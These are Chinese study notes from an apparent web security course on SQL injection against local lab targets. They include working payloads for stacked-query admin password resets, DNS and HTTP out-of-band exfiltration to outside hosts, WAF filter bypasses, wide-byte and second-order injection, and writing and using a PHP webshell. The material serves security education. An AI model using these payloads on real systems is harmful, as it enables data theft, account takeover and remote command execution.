- 在测试过程中，也许password解密难度很高，无法解密（很常见）
  - 这时我们就可以使用堆叠注入，对admin账户的password进行更新。 
  - 成功登录之后再进行复原。 
  - 使用已知密码123456，通过 https://www.cmd5.com/hash.aspx?s=123456 获得 MD5密文，e10adc3949ba59abbe56e057f20f883e
  - 基于堆叠注入，更改账号密码，http://127.0.0.1:81/vulnerabilities/sqli/?id=1'; update users set password='e10adc3949ba59abbe56e057f20f883e' where user_id=1; -- &Submit=Submit#
  - 重新登录，用户名 admin，密码 123456，登录成功
  - 将账号密码，更改回原来的状态，http://127.0.0.1:81/vulnerabilities/sqli/?id=1'; update users set password='5f4dcc3b5aa765d61d8327deb882cf99' where user_id=1; -- &Submit=Submit#
  - 此时刚才登录的账号，并不会因为数据库中的密码不一样了，而发生退出现象
- 在 容器内部的数据库查看用户表的信息数据
  - 登录：mysql -u root -p
  - show databases;
  - use dvwa;
  - show tables;
  - select * from users;



### OOB 注入

#### SQL注入的不同类型 

- SQL注入主要分为以下5种

  - Error-based SQL injection（报错型注入）
  - UNION query SQL injection（可联合查询注入）
  - Boolean-based blind SQL injection（布尔型注入）
  - Time-based blind SQL injection（基于时间延迟注入）
  - Stacked queries SQL injection（可多语句查询注入） 

- SQL 注入的 5 种类型 ---> 进一步抽象 

  - | 攻击类别    | SQL注入类型                                                  | 说明                                                 |
    | ----------- | ------------------------------------------------------------ | ---------------------------------------------------- |
    | INBAND      | Error-based Injecction <br />UNION query Injection           | 在应用内直接获取数据，通过应用的返回或者报错提取数据 |
    | INFERENCE   | Boolean-based Blind Injection <br />Time-based Blind Injection | 通过应用的非直接数据反馈进行推断                     |
    | OUT OF BAND | OOB SQL Injection                                            | 通过其他**信道**获得数据                             |



#### OOB 定义 

- 带外通道技术（Out-Of-Band） 
  - 带外通道技术(OOB)让攻击者能够通过另一种方式来确认和利用没有直接回显的漏洞。
  - 这一类漏洞中，攻击者无法通过恶意请求直接在响应包中看到漏洞的输出结果。
  - 带外通道技术通常需要脆弱的实体来生成带外的TCP/UDP/ICMP请求，然后，攻击者可以通过这个请求来提取数据。 
- 一次OOB攻击能够成功是基于：
  1. 存在漏洞的系统；
  2. 外围防火墙的出站请求。 



#### OOB v.s. Inband 

- Inband（常规通信信道）

![1617261728018](HackerMeWeb.assets/1617261728018.png)

- OOB（非应用内信道） 

![1617261759739](HackerMeWeb.assets/1617261759739.png)



#### OOB v.s. Time-based Blind Injection 

- 带外通道技术（Out-Of-Band） 
  - 可以看做是另一种盲注技术；
  - 与盲注相比，**速度**具有优势，因为其实际上实现了**变相的回显**。 



#### DNS 迭代查询原理 

- DNS 协议 

  - 域名系统（Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和 IP 地址相互映射的一个**分布式数据库**，能够使人更方便地访问互联网。
  - DNS 使用 TCP 和 UDP 端口 **53**。
  - 当前，对于每一级域名长度的限制是 63 个字符，域名总长度则不能超过 253个字符。 
- DNS迭代查询原理 

  - 首先有一个可以配置的域名test.com。
  - 通过**代理商**设置域名test.com的nameserver为自己拥有的服务器（S）的IP。
  - 然后在S上搭建DNS Server。
  - 这样 test.com及其所有子域名的查询都会推送到S上，同时S也能够实时的**监控**针对test.com的查询请求。  
  
- DNS 查询
  - DNS 是域名解析系统，它的功能是将站点的域名转换为站点的 IP 地址。 
- DNS 查询-递归查询 
  - 根DNS服务器：只有 13 台根服务器（准确来说是13个IP），通过根服务器可以查询域名所属的顶级服务器
  - 顶级DNS服务器：顶级服务器对应一个顶级域名，如 com/net/org/cn/edu/...，通过顶级域名服务器，可以查询二级域
  - 权威DNS服务器：权威服务器对应二级域，如qq.com/yahoo.com/poly.edu/...

![1617266108794](HackerMeWeb.assets/1617266108794.png)

- 泛域名解析
  - 泛域名解析就是利用通配符的方式将所有的次级域名指向同一 IP。
  - www.example.com 和 abc.example.com 都会**访问到同一个站点**。
  - 在注册域名并配置域名解析的时候，在 DNS 服务器中配置了下面的记录。 
  - *.example.com   --- >  IP





#### tcpdump 


  - 基于Unix系统的命令行的数据报嗅探工具，可以抓取流动在网卡上的**数据包**。
  - 原理：
    - Linux抓包是通过注册一种**虚拟的底层网络协议**来完成对网络报文（准确的是网络设备）消息的处理权。
    - 系统在收到报文的时候就会给这个伪协议**一次机会**，让它对网卡收到的报文进行一次处理，此时该模块就会**趁机**对报文进行窥探。 
- tcpdump –n port 53 

  - 备注：如果权限不够，使用：sudo tcpdump –n port 53 



#### UNC路径 

- UNC路径 
  - UNC (Universal Naming Convention) /通用命名规则。
  - Windows主机默认存在，Linux主机默认不存在。格式：`\\servername\sharename`，其中servername是服务器名。sharename是共享资源的名称。
  - 我们平时使用的打印机、网络共享文件夹时，都会用到UNC填写地址。并且当我们在使用UNC路径时，会对域名进行DNS查询。 
  - 注意：UNC 路径只能在 Windows 系统中生效。 
- widows  UNC路径  测试
  - 第一个 windows 系统，创建一个文件夹，创建一个文件，写上内容
  - 点击文件夹的属性，进入共享，点击共享（S）,选择 Everyone，点击共享，弹出框点击确定
  - 记住地址，`\\DESKTOP-6F8M9D7\share_test`
  - 看下面的密码保护，点击网络和共享中心，弹出框，下拉到最下面 密码保护的共享，点击关闭密码保护共享。
  - 第二个电脑，直接在网络中，输入上面的地址就可以看到对应的文件夹，但是没有权限看到里面的内容，但是在本机的网络中可以开电脑所有的内容



#### CEYE 平台 

- 官网：http://ceye.io/
  - CEYE 可以监控 DNS 请求，并且配置了泛域名解析。 
- CEYE 平台
  - 使用 CEYE 平台首先需要注册账号（ceye.io）。（备注：可以直接使用微信登录）
  - 注册成功并登录该平台后，在 [profile 页面](http://ceye.io/profile)可以看到分配给你的域名：Identifier --> fehmp3.ceye.io。 
  - 测试泛域名解析
    - 本机命令行，ping fehmp3.ceye.io，可以看到正常的ping通
    - 在 profile 页面中，点击 NDS Query，可以看到 刚刚 ping 的请求记录
    - 本机命令行，ping test.fehmp3.ceye.io，可以看到正常的ping通
    - 在 NDS Query中，点击 Reload ，可以看到新的 ping 请求记录



#### phpstudy

- 软件安装
  - 本靶场需要在 Windows 环境下搭建，在软件目录下提供了一键搭建WNMP/WAMP环境的软件。
  - 根据自己的系统选择合适的phpstudy，解压后直接安装即可（傻瓜式安装）。
  - 如果提示缺少运行库，可以在phpstudyVC9-14(32位和64位)运行库中找到自己需要的库双击安装即可。
  - 安装成功后，一键启动服务，然后将靶场代码放到网站根目录下即可。 

- 切换PHP环境 
  - phpstudy 安装完成后，直接双击打开
  - 点击首页 >>> 套件 >>> 启动（Apache2.4.39 和 MySQL5.7.26）
  - 点击环境 >>> 工具 >>> php >>> 安装 >>> php5.2.17版本
  - 点击网站 >>> 管理 >>> php版本 >>> 选择 php5.2.17版本



#### MySQL root远程登录 

- 安装数据库工具（客户端）
  - 点击环境 >>> 工具 >>> 数据库工具（客户端）>>> 安装 >>> 点击管理 >>> 弹出新窗口 >>> 点击打开登录信息（打开） >>> 跳出数据库登录 >>> 输入用户名 root >>>  输入密码 root（密码从点击数据库 >>> 鼠标悬停在密码上就会显示出来） >>> 确定登录 >>> 登录成功
- 允许 MySQL root远程登录 
  - 在数据库工具（客户端）登录成功中，点击 SQL 编辑器，输入下面的SQL
  - show databases;
  - use mysql;
  - select database();
  - grant all privileges on *.* to root@'%' identified by '密码(我这里替换成root)';
  - flush privileges; 
  - 此时就可以通过局域网的另一台电脑访问
    - 输入mysql -h 192.168.1.102（换成自己的IP） -u root -p
    - 密码 root
    - 连接成功
- 回忆盲注的时候，需要使用 ascii码进行一个一个的试一试
  - ascii(substr(database(),1,1))=32
  - ascii(substr(database(),2,1))=32
  - ascii(substr(database(),3,1))=32 
- 想一下带外注入，OOB的好处
  - 带外注入可以简化盲注的过程，可以直接将查询到的结果通过 DNS 记录显示出来。 



####  load_file 函数

- 学习MySQL的 load_file 函数
  - load_file() 函数是 MySQL 中一个常用的函数，主要用来读取文件内容。
  - 函数原型：load_file(file_path)
  - 该函数会读取文件内容，并将文件内容作为字符串返回。如果读取失败会返回 NULL。 
  - 该函数在执行过程中需要遵循 secure_file_priv 的限制，如果直接执行 ，load_file() 函数在读取目标文件内容的时候失败了。 
    - 在本地创建一个 文件夹，echo 221232 > test.txt
    - 连接MySQL，输入 select load_file("/tmp/test.txt") as result;
    - 读取失败，结果为 NULL
  - 分析失败原因
    - 执行命令，show global variables like "%secure_file_priv%";
    - 看到 value 是 /var/lib/mysql-files/，表示secure_file_priv 变量的值为 /var/lib/mysql-files，因此load_file() 函数只能够读取该目录下的文件的内容。 
    - 可以在  /var/lib/mysql-files/ 文件下创建文件，进行 load_file 函数测试
  - 如果想要完成任意目录下文件读取需要在 /etc/my.conf(my.ini) 中将 secure_file_priv 的值置为空。 
    - 在 phpstudy 中，点击 设置  >>> 配置文件 >>> mysql.ini >>> 点击 MySQL5.7.26 >>> 打开本地记事本 >>> 在[mysqld]下面新增加 secure_file_priv=  >>> 保存 >>> 关闭记事本
    - 点击 首页 >>> 套件 >>> MySQL5.7.26 >>> 点击 重启
    - 完成上面的配置并重新启动 MySQL 后，重新连接mysql，
    - 执行命令，show global variables like "%secure_file_priv%";
    - 此时的 secure_file_priv 的值变成了空。 
    - 并且可以访问任何目录下的文件内容
  - 测试访问任何目录的文件
    - 远程连接 MySQL
    - 输入 select load_file("D:/phpstudy_pro/1.txt") as result;
    - 得到输出结果
    - 也可以输入 select load_file("C:Users/rmliu/Desktop/test.txt") as result;





#### OOB 注入实战

- 连接数据库，测试
  - mysql -h 192.168.1.102 -u root -p root
  - use mysql;
  - select database();
  - `select concat('\\\\',(select database()), '.fehmp3.ceye.io');`
    - 此时可以拼接处整个 UNC 的访问路径，\\mysql.fehmp3.ceye.io
  - 测试为什么使用四个 \，分别输入一个\，两个\
    - `select concat('\\\\',(select database()), '.fehmp3.ceye.io\123');`
    - `select concat('\\\\',(select database()), '.fehmp3.ceye.io\\123');`
- 使用 load_file 测试是否进行 DNS 访问
  - 输入，`select load_file(concat('\\\\',(select database()), '.fehmp3.ceye.io'));`
  - 此时到，http://ceye.io/records/dns 中，查看 DNS Query，刷新 Reload 可以看到有访问记录，在 name 栏目看到对应的数据库名字是 mysql
  - load_file 函数除了能够读取本机文件还可以通过 UNC 路径读取远程机器上的文件 
- SQL 注入 获取数据库名
  - `?id=1' and load_file(concat("\\\\",(select database()), ".fehmp3.ceye.io\\abc")) --+ `
- QL 注入 获取表名
  - `?id=1' and load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema='security' limit 0,1),".7as54b.ceye.io\\abc")) --+ `



#### 大文本传输 

- 域名 的限制
  - www . example . com
  - 域名由标签组成，以点（.）分隔，标签的长度不可以超过 63 个字符。
  - 整个域名不可以超过 253 个字符，包括点（.）。 
- `select concat(to_base64(substr(load_file("D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\my.ini"),1,15)),".fehmp3.ceye.io") as result;`
  - 使用 load_file 读取文件内容
  - 使用 substr 对文件内容进行切片
  - 使用 to_base64 对切片的内容进行编码
  - 使用 concat 将编码后的内容与域名进行拼接，得到 W215c3FsXQ0KZGVmYXVs.fehmp3.ceye.io
  - 使用 load_file 访问该 UNC 路径 



#### HTTP 带外注入 

- UTL_HTTP.request

  - UTL_HTTP.REQUEST ( url IN VARCHAR2, proxy IN VARCHAR2 DEFAULT NULL);
    - url：目标服务器地址
    - porxy：代理服务器地址，该参数为可选参数
  - 它的返回类型是长度为 2000 或更短的字符串，它包含从 HTTP 请求返回到参数 URL 的HTML 结果的前 2000 个字节。 

- 环境介绍 

  ![1617280278201](HackerMeWeb.assets/1617280278201.png)

-  通过 SQL 注入让目标服务器执行

  - select UTL_HTTP.request('http://192.168.25.166/test.php'||'?id='||(select version from v$instance)) from dual;
  - 此时 Oracle 发起 HTTP 请求
  - 在 192.168.25.166 上的 test.php 会记录传递来的数据，并写入 test.txt 文件中。
  - 通过 tail -f test.txt 获得文件中的数据 





### 混淆和绕过注入

#### 混淆和绕过定义

- 混淆和绕过防御的地点

  - 绕过 WAF，web 应用防火墙

    ![1617285838140](HackerMeWeb.assets/1617285838140.png)

- 混淆和绕过 

  - 普通的注入方式过于明显，很容易被检测。
  - 因此，需要改变攻击的手法，绕过检测和过滤，即混淆和绕过。
  - 具体操作针对于服务端和 WAF 的防御机制有多种手段。 



#### 关键词组过滤

- 关键词组过滤指对于用于 SQL 注入攻击相关的语句加以过滤，如 select，union，sleep 等，在 WAF 和服务端都可以进行。

- 对于此种防御，我们以“union”为例讲解：即在服务端对用户输入的 union 词组删除。 

- union 例子的后端代码

  - ```php
    $sql .= "WHERE id =".sqli($id);
    $sql = str_replace("union", "", $sql);  // 直接进行字符串替换
    ```

- 注入测试

  - 安装，注册，并登录靶机
  - 选择bug类型：Choose your bug: SQL Injection (GET/Select)
  - 选择bug等级：Set your security level：medium
  - 使用SQL测试，http://127.0.0.1/sqli_2.php?movie=1 union select 1,2,3,4,5,6,7 &action=go
    - Error: SELECT * FROM movies WHERE id = 1  select 1,2,3,4,5,6,7 
    - union 没见了
  - 基于大小写绕过 ，使用SQL测试，http://127.0.0.1/sqli_2.php?movie=1 UNion select 1,2,3,4,5,6,7 &action=go
    - info: SELECT * FROM movies WHERE id = 1 UNion select 1,2,3,4,5,6,7 
    - 通过更改大小写，获得输出结果
  - 使用SQL测试，http://127.0.0.1/sqli_2.php?movie=13 UNion select 1,2,3,4,5,6,7 &action=go
    - 通过输入一个不存在的电影，成功注入SQL
  - 获得数据库名字
    - http://127.0.0.1/sqli_2.php?movie=13 UNion select 1,2,database(),4,5,6,7 &action=go
    - 显示数据库名字，bWAPP



#### MySQL 大小写绕过

- 备注：mysql 5.6 版本和8.0版本的大小写敏感程度不一样，需要注意区分
- 测试SQL8.0
  - show databases;
  - show databaSEs;
  - USE test;
  -  use TEST;  -- 失败
  -  select * from TEST;  -- 失败
  - SeLecT * from test;



#### || 和 && 过滤绕过 

- 过滤代码
  - `preg_match('/(and|or)/i', $id)`
- 过滤情况
  - `1 or 1 = 1`
  - `1 and 1 = 1`
- 绕过情况
  - `1 || 1 = 1`
  - `1 && 1 =1`
- SQL 测试
  - show databases;
  - use testhacker;
  - select * from test;
  - select * from test where id=1;
  - select * from test where id=1 and name='test1';
  - select * from test where id=1 && name='test1';
  - select * from test where id=1 or name='test3';
  - select * from test where id=1 || name='test3';



#### union 过滤绕过 

- 过滤代码
  - `preg_match('/(and|or|union)/i', $id)`
- 过滤情况
  - `union select user, password from users`
- 绕过情况
  - `|| (select user from users where user_id = 1) = 'admin'`
- 思考🤔
  - 怎么知道 users表/ user列/admin 字段呢？全靠猜么？ 
- SQL 测试
  - select * from test;
  - select * from test where id=1;
  - select * from test where id=1 || (select count(*) from test)>0;
    - 首先分清 || 符号的作用范围，是 where 之后的内容；
    - test 表名的判断？首先确实可以猜，尤其是 users 这种常用表；
    - 如果猜不到？通过 information_schema.tables 及 substr 来联合判断；
    - 回到上一页的问题，列名及字段内容也是同理。 



#### where 过滤绕过

- 过滤代码
  - `preg_match('/(and|or|union|where)/i', $id)`
- 过滤情况
  - `|| (select user from users where user_id = 1) = 'admin'`
- 绕过情况 
  - `|| (select user from users limit 1,1) = 'admin'`
- SQL 测试
  - select * from test;
  - select * from test where id=2;
  - select * from test limit 1,1;
  - select * from test limit 1,2;



#### limit 过滤绕过

- 过滤代码
  - `preg_match('/(and|or|union|where|limit)/i', $id)`
- 过滤情况
  - `|| (select user from users limit 1,1) = 'admin'`
- 绕过情况 
  - `|| (select min(user) from group by user_id having user_id = 1) = 'admin'`
- SQL 测试
  - select * from test;
  - select name from test where id=1 limit 1;
  - select id,min(name) from test group by id having id =1;
    - 为什么要使用 min(name)，而不直接使用 name 呢？
    - 基于 group by 和 having 的使用，会创建一个虚拟表，



#### group by 过滤绕过

- 过滤代码
  - `preg_match('/(and|or|union|where|limit|group by)/i', $id)`
- 过滤情况
  - `|| (select min(user) from group by user_id having user_id = 1) = 'admin'`
- 绕过情况 
  - `|| select substr((select group_concat(name) name from test), 1, 1) = 't'`
- SQL 测试
  - select group_concat(name) name from test;
  - select group_concat(name) name_test from test;
  - select substr((select group_concat(name) name_test from test), 1, 1) = 't';



#### select 及单引号过滤绕过

- 过滤代码
  - `preg_match('/(and|or|union|where|limit|group by|select|\'|)/i', $id)`
- 过滤情况
  - `|| select substr((select group_concat(name) name from test), 1, 1) = 't'`
- 绕过情况 
  - `|| substr(name ,1 , 1) = 0x74`
  - `|| substr(name ,1 , 1) = unhex(74)`
- SQL 测试
  - select * from test where id=1 limit 1;
  - select * from test where id=1 || substr(name, 1,1)='t';
  - select * from test where id=1 || substr(name, 1,1)=0x74;



#### hex、unhex、及 substr 过滤绕过

- binary  函数
  - binary  函数 是可以 直接进行比较的
- 过滤代码
  - `preg_match('/(and|or|union|where|limit|group by|select|\'|hex|unhex|substr)/i', $id)`
- 过滤情况
  - `|| substr(name ,1 , 1) = unhex(74)`
- 绕过情况 
  - `|| binary(name) = 0x74657374`
- SQL 测试
  - select * from test;
  - select * from test where id=1 && binary(name)=0x74;
    - 查询结果为 空
  - select * from test where id=1 && binary(name)>0x74;
    - 查询成功



#### 空格过滤绕过 

- 过滤代码
  - `preg_match('/(and|or|union|where|limit|group by|select|\'|hex|unhex|substr|\s)/i', $id)`
- 过滤情况
  - `|| binary(name) = 0x74657374`
- 绕过情况 
  - `|| binary(name) = 0x74657374`
- SQL 测试
  - select * from test;
  - select name from test where id=1;
  - `select/**/name/**/from/**/test/**/where/**/id=1;`
  - 除了注释符号，也可以通过 URL 编码绕过 WAF。
  - 这部分我们会在前端安全部分讲解 



#### = 过滤绕过 

- 过滤代码
  - `preg_match('/(and|or|union|where|limit|group by|select|\'|hex|unhex|substr|\s|=)/i', $id)`
- 过滤情况
  - `1/**/||/**/binary(name)/**/=/**/0x74657374`
- 绕过情况 
  - `1/**/||/**/binary(name)/**/=/**/0x74657374`
- SQL 测试
  - select * from test where name='test1';
  - select * from test where name like 'test1';



#### 双写绕过 

- 安装，注册，并登录 bWAPP 靶机
- 选择bug类型：Choose your bug: SQL Injection (GET/Select)
- 选择bug等级：Set your security level：medium
- 注入测试
  - http://127.0.0.1/sqli_2.php?movie=1 union select 1,2,3,4,5,6,7 &action=go
    - 此时的 union 字段会被 程序逻辑替换成 空字符串
  - http://127.0.0.1/sqli_2.php?movie=1 uniunionon select 1,2,3,4,5,6,7 &action=go
    - 在 union 内写一个union 就可以实现不被替换掉
  - http://127.0.0.1/sqli_2.php?movie=13 uniunionon select 1,2,3,4,5,6,7 &action=go
    - 输入一个不存在的电影名字，就可以看到页面的展示逻辑



#### 双重编码绕过

- 过滤代码
  - WAF：urldecode(param)->过滤 
- 过滤情况
  - `1/**/||/**/binary(name)/**/=/**/0x74657374`
- 绕过情况
  - `1%252f ...`
- 说明 
  - `%252f /   %252a *  `



#### 转义函数

- 转义函数也不是万能的

- 简单绕过转义函数 

  - ```php
    $Id = mysql_real_escape_string("1 OR 1=1");
    
    $Sql = "SELECT * FROM table WHERE id = $Id";
    
    $Sql = "SELECT * FROM table WHERE id = 1 OR 1=1";
    ```

  - 更换了 SQL 的执行逻辑



#### 总结

简单来说，SQL注入的混淆之绕过 WAF  分为几种方式：
1. SQL 语句的同义变形体；
2. 利用 WAF 规则设定的缺陷（如双写） ；
3. 利用技术链中间环节绕过（如编码）。 



### 宽字节注入 

#### sqli-labs 容器安装

- 下载及启动方式
  - docker pull registry.cn-shanghai.aliyuncs.com/yhskc/sqli-labs
  - docker images
  - docker container list -a
  - docker ps
  - docker stop zealous_heyrovsky
    - 关闭原本占用80端口的 bWAPP
  - docker run -d -p 0.0.0.0:80:80 registry.cn-shanghai.aliyuncs.com/yhskc/sqli-labs
  - docker ps
    - 看到已经启动成功
  - docker stop fervent_nightingale
- 关闭占据 80 端口的 bwapp，打开 sqli-labs，
- 仅映射到 80 端口，若映射到其他端口，实验跳转过程不方便。 



#### 逃逸绕过转义函数（宽字节注入） 

- 安装 qli-labs  靶机

- 打开浏览器，输入，127.0.0.1/

- 初始化数据表，点击页面上的[Setup/reset Database for labs](http://127.0.0.1/sql-connections/setup-db.php) ，可以进行页面刷新操作

- 输入新地址，http://127.0.0.1/Less-36/?id=133

  - 进行 union 注入
  - http://127.0.0.1/Less-36/?id=133 %df%27 union select 1,2,3 %23
    - %27 ------ ‘
    - %23 ------ #
    - %df ------ 无意义
    - %5c ------ \ 
  - 页面展示：
    - `Hint: The Query String you input is escaped as : 133 �\' union select 1,2,3 #`
    - `The Query String you input in Hex becomes : 31333320df5c2720756e696f6e2073656c65637420312c322c332023`
    - Your Login name:2
    - Your Password:3
  - 更换select 的内容，展示数据库的用户名，完成注入
    - http://127.0.0.1/Less-36/?id=133 %df%27 union select 1,user(),3 %23
    - Your Login name:root@localhost
    - Your Password:3

- 注入原理

  - 数据库执行的命令

  - ```php
    mysql_query("SET NAMES gbk");
    $sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
    $result = mysql_query($sql);  // 基于 gbk 编码方式，进行转义操作
    ```

  - 原本直接输入 id 就可以完成查询，现在构造了一个 %df%27 ，由于%27 表示的是'，在数据库操作的时候需要转义，在其前面加上一个反斜杠 \，而反斜杠的编码为 %5c，结合前面的%df，就组成了新的字符 %df5c，而这个字符对应在 gbk 表中的额一个字，如下图所示。

  - ![1617356272568](HackerMeWeb.assets/1617356272568.png)

  - 此时新的 SQL 语句就变了，变成 `$sql= "select * from users where id = '133運' union select 1,user,3 "; `

  - 单引号刚好闭合前面的引号，完成SQL注入



#### URL编码 

- URL编码 ，从 %00 到 %8f
- 见下表

![1617356441969](HackerMeWeb.assets/1617356441969.png)



#### SET NAMES X 

- SET NAMES X 与下面这三句话效果等同

  - ```sh
    SET character_set_client = x;
    SET character_set_results = x;
    SET character_set_connection = x;
    ```

  - 同样这些参数也可以通过 my.ini/cnf 进行静态设置 



#### GBK编码 

- 常见的汉字字符集编码
  - GB2312编码:1981年5月1日发布的简体中文汉字编码国家标准。GB2312对汉字采用**双字节编码**，收录7445个图形字符，其中包括6763个汉字。
  - GBK编码∶1995年12月发布的汉字编码国家标准，是对GB2312编码的扩充，对汉字采用双字节编码。GBK字符集共收录21003个汉字，包含国家标准GB13000-1中的全部中日韩汉字，和BIG5编码中的所有汉字。
  - Unicode编码︰国际标准字符集，它将世界各种语言的每个字符定义一个唯一的编码，以满足跨语言、跨平台的文本信息转换。



#### GB2312与GBK编码 

- GB2312
  - 当国人得到计算机后，那就要对汉字进行编码。在ASCII码表的基础上，小于127的字符意义与原来相同;而将两个大于127的字节连在一起，来表示汉字，前一个字节从OxA1(161)到OxF7(247)共87个字节，称为高字节，后一个字节从OxA1 (161)到 OxFE(254)共94个字节，称为低字节，两者可组合出约8000种组合，用来表示6763个简体汉字、数学符号、罗马字母、日文字等。
  - 在重新编码的数字、标点、字母是两字节长的编码，这些称为"全角"字符;而原来在ASClI码表的127以下的称为"半角"字符。简单而言，GB2312就是在ASCII基础上的简体汉字扩展。
  - website: http://www.fileformat.info/info/charset/GB2312/list.htm
  - example:
    - 你好
    - xc4\xe3%xbaixc3
- GBK
  - 简单而言，GBK是对GB2312的进一步扩展(K是汉语拼音kuo zhan(扩展)中"扩"字的声母)，收录了21886个汉字和符号，完全兼容GB2312。



#### 寻找注入点 

- 基于 %df 和 转义符反斜杠 %5c
- 碰撞出来了新的火花，此时就可以完成宽字节注入

![1617356272568](HackerMeWeb.assets/1617356272568.png)





### 二次注入 

#### 二次注入定义

- 数据库内容是否可信？ 
  - 不一定可信
- 给定一个账号注册输入 的场景
  - 由于保存数据的时候，会有一个转义的防御机制，导致最终存入数据库的内容，就是自己页面注册账号的值，并不会变化
  - 但是在后续业务操作逻辑中，修改内容，再一次调用的时候，就会出现二次注入

![1617357895567](HackerMeWeb.assets/1617357895567.png)



#### 二次注入实战

- 安装 qli-labs  靶机，启动 sqli-labs 

- 打开浏览器，输入，127.0.0.1/

- 进入新网址，http://127.0.0.1/Less-24

- 注册新用户

  - 用户名：admin'#

  - 密码：123

  - 用户注册源码

    - docker exec -it fervent_nightingale bash

    - cd /var/www/html/Less-24

    - vi login_create.php

    - 将用户输入的内容进行了转义，然后保存到数据库

      ![1617358390111](HackerMeWeb.assets/1617358390111.png)

- 登录数据库，查看注册的用户信息

  - docker ps
  - docker exec -it fervent_nightingale bash
  - mysql -u root -p
  - show databases;
  - use security;
  - show tables;
  - select * from users;
    - 此时就可以看到用户的注册信息，密码还是明文存储的

- 登录刚注册的用户

  - 用户名：admin'#
  - 密码：123

- 更改用户密码

  - 当前密码：123
  - 新密码：456
  - 重置
  - 数据库查看，更改后的用户信息
  - select * from users;
    - 发现 admin 的密码变成了 456
    - 而 admin'# 的密码还是 123

- 源码剖析 

  - cd /var/www/html/Less-24
  - vi pass_change.php
  - 可以看到更新密码的时候，在 UPDATE 语句中，`$pass` 的值没有问题，`$username`的值出问题了，由于当前的用户名为 admin'# ，导致当前的单引号直接闭合了前面的用户名，后面的#号直接注释了后面的密码语句
  - 此时 UPDATE 语句执行结束之后，admin 的密码就被更改了，而admin'# 的密码没有被更改，实现二次注入。
  - ![1617358822001](HackerMeWeb.assets/1617358822001.png)
  - 继续分析源码，可以看到用户的cookie过期时间为 15 min。
  - ![1617358717275](HackerMeWeb.assets/1617358717275.png)



#### 防御方式 

- 代码与数据分离：预编译
- 禁止用户账号出现特殊符号 



### 命令执行 

#### SQL注入之命令执行原理

通过SQL注入，直接写入webshell文件到服务器，通过GET方法或者POST方法提交并执行外部指令，为后续进一步远程控制，提权，创造条件。

关键语句：

- <?php system($_GET["cmd"]); ?> 

注入方式：

```sh
select username,password from users where id =‘1’union select 1,'<?php system($_GET["cmd"]); ?>' into outfile '/var/www/html/cmd.php‘ ; 
```



#### SQL 语句注入实战

SQL 注入测试：

- 安装，注册，并登录 bWAPP 靶机
- docker container list -a
- docker start zealous_heyrovsky
- docker ps
- docker exec -it zealous_heyrovsky bash
- mysql -u root -p
- show databases;
- use bWAPP;
- select database();
- show tables;
- select * from heroes;
-  select * from heroes where id=7;
- select * from heroes where id=7 union select 'hello' into outfile '/var/www/html';
  - 报错，The used SELECT statements have a different number of columns
  - 使用 union 的时候，需要保证前后的字段数是一样的
  - 可以使用这种语句测试，select * from heroes where id=7 union select 1,2,3,4,5,'hello' into outfile '/var/www/html';
- select * from heroes where id=7 union select 1,2,3,'hello' into outfile '/var/www/html/ccc.php';
  - 如果报错，且状态码 errcode 是 13，则表示文件写入的权限不够
  - 验证权限
    -  exit
    - cd /var/www/html/
    - ll
    - 查看到 images 的文件，权限都是 当前用户，使用其进行测试
    - drwxrwxrwx 1 www-data www-data  4096 Mar 30 05:37 images/
  - mysql -u root -p
  - use bWAPP;
  - select * from heroes where id=7 union select 1,2,3,'hello' into outfile '/var/www/html/images/ccc.php';
- 浏览器查看
  - 地址栏输入：http://127.0.0.1/images/ccc.php
  - 可以看到对应的内容为：1	2	3	hello
  - 如果其中的内容换成 webshell ，就可以执行注入了



#### UDF注入实战

还可以利用“用户自定义函数”的方式，即User-Defined Functions（UDF）来执行命令。通过lib_mysqludf_sys提供的函数可以执行系统命令,关键语句：

- sys_eval()，执行任意命令，并将输出返回
- sys_exec()，执行任意命令，并将返回码返回
- sys_get()，获取一个环节变量
- sys_set()，创建或修改一个环境变量 

UDF文件获取

- https://github.com/mysqludf/lib_mysqludf_sys 中的，[lib_mysqludf_sys.so](https://github.com/mysqludf/lib_mysqludf_sys/blob/master/lib_mysqludf_sys.so) 文件。
- https://github.com/sqlmapproject/sqlmap 中的，sqlmap/data/udf/mysql/ 下的 不同平台和位数的文件。
  - sqlmap下的文件经过编码，需要使用 sqlmap/extra/cloak目录下的cloak.py文件进行解码
  - python cloak.py -d -i /Users/apple/workplace/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_linux.so 
  - python cloak.py -d -i E:\39-网络安全\HackerMeSourceCode\sqlmap\data\udf\mysql\windows\64\lib_mysqludf_sys.dll_ -o lib_windows.dll 



#### webshell 命令执行 

SQL 注入测试：

- 安装，注册，并登录 bWAPP 靶机
- 选择bug类型：Choose your bug: SQL Injection (GET/Select)
- 选择安全等级：Set your security level: medium
- 测试 URL
  - http://127.0.0.1/sqli_2.php?movie=1&action=go
- 联合查询
  - http://127.0.0.1/sqli_2.php?movie=1 union select 1,2,3,4,5 #&action=go
- 双写注入
  - http://127.0.0.1/sqli_2.php?movie=1 uniounionn select 1,2,3,4,5 #&action=go
  - union 展示相同数量的 内容
  - http://127.0.0.1/sqli_2.php?movie=1 uniounionn select 1,2,3,4,5,6,7 #&action=go
- 实现注入
  - http://127.0.0.1/sqli_2.php?movie=13 uniounionn select 1,2,3,4,5,6,7 #&action=go
- webshell 注入
  - http://127.0.0.1/sqli_2.php?movie=13 uniounionn select 1,2,3,4,5,6,'<?php system($_GET["cmd"]); ?>' into outfile '/var/www/html/images/cmd.php' &action=go
  - 出现错误，Error: File '/var/www/html/images/cmd.php' already exists
  - 更换文件名，http://127.0.0.1/sqli_2.php?movie=13 uniounionn select 1,2,3,4,5,6,'<?php system($_GET["cmd"]); ?>' into outfile '/var/www/html/images/cmd2.php' 
  - 此时进入 bWAPP 可以看到写入的文件
    - cd /var/www/html/images
    - cat cmd2.php
- 访问文件
  - http://127.0.0.1/images/cmd2.php
  - 执行命令
    - http://127.0.0.1/images/cmd2.php?cmd=ps -ef
    - http://127.0.0.1/images/cmd2.php?cmd=uname -a
    - http://127.0.0.1/images/cmd2.php?cmd=whoami
- windows 安装 nc
  - 下载地址，https://eternallybored.org/misc/netcat/
  - 解压，添加环境变量即可
- 使用 nc 测试
  - bWAPP 中打开交互式命令行
  - ping 192.168.1.102 ，看一下网络是否与主机通畅，ip地址获取方式 命令行中输入 ipconfig
  - 主机，监听端口命令，nc -l 8888
